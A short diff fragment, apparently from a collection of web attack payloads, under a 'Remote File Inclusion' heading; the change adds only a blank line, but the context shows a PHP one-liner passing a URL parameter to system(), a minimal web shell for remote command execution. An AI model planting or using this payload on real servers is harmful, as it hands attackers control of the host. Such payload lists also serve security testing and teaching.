@@ -29,6 +29,7 @@ Remote File Inclusion:
 			</script>
 		-->
 		<?php echo "<?php"; ?>
+		
 		system($_GET['cmd']);
 
 	
